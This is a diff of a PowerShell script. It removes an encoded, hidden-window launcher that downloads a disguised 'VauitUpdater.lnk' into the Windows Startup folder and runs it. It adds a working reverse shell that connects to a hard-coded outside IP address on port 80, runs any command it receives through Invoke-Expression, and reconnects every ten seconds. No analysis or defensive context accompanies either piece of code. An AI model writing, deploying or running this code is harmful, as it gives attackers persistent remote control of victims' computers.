@@ -1,1 +1,40 @@
-start-process powershell -argumentlist "-e JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AbgA3AC0AMQAvADQALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAFYAYQB1AGkAdABVAHAAZABhAHQAZQByAC4AbABuAGsAIgAKAGMAZAAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AHUAcABcACIACgAkAGQAZQBzAHQAUABhAHQAaAAgAD0AIAAiAC4AXABWAGEAdQBpAHQAVQBwAGQAYQB0AGUAcgAuAGwAbgBrACIACgB0AHIAeQAgAHsACgAgACAAIAAgAGkAZgAgACgALQBuAG8AdAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGQAZQBzAHQAUABhAHQAaAApACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACMAIAAYBEEEPwQ+BDsETAQ3BEMENQQ8BCAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACwAIABHBEIEPgQxBEsEIAA/BD4EOQQ8BDAEQgRMBCAAPgRIBDgEMQQ6BEMEIAAyBCAAMQQ7BD4EOgQ1BCAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AFAAYQB0AGgAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAdABvAHAACgAgACAAIAAgAH0ACgB9ACAAYwBhAHQAYwBoACAAewAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIARABvAHcAbgBsAG8AYQBkACAARQByAHIAbwByADoAIAAkACgAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAKAH0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFMAdABhAHIAdAAgAE0AZQBuAHUAXABQAHIAbwBnAHIAYQBtAHMAXABTAHQAYQByAHQAdQBwAFwAVgBhAHUAaQB0AFUAcABkAGEAdABlAHIALgBsAG4AawAiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=" -windowstyle hidden
+$ip = "176.122.27.51"
+$port = 80
+$retryDelay = 10
+while ($true) {
+    try {
+        Write-Host "Connecting to $ip`:$port..." -ForegroundColor Cyan
+        $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $s = $t.GetStream()
+        $r = New-Object System.IO.StreamReader($s)
+        $w = New-Object System.IO.StreamWriter($s)
+        $w.AutoFlush = $true
+
+        Write-Host "Connected!" -ForegroundColor Green
+        $w.WriteLine("--- Connected: $(whoami) ---")
+
+        while($t.Connected) {
+            $w.Write("PS > ")
+            $c = $r.ReadLine()
+
+            if ($null -eq $c) { break }
+            if ([string]::IsNullOrWhiteSpace($c)) { continue }
+
+            try {
+                $out = Invoke-Expression $c 2>&1 | Out-String
+                if ($out) { $w.WriteLine($out) } else { $w.WriteLine(" ") }
+            } catch {
+                $w.WriteLine("Error: " + $_.Exception.Message)
+            }
+        }
+    } catch {
+        Write-Host "Connection Error: $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+    if ($r) { $r.Close() }
+    if ($w) { $w.Close() }
+    if ($s) { $s.Close() }
+    if ($t) { $t.Close() }
+
+    Write-Host "Retrying in $retryDelay sec..." -ForegroundColor Cyan
+    Start-Sleep -Seconds $retryDelay
+}
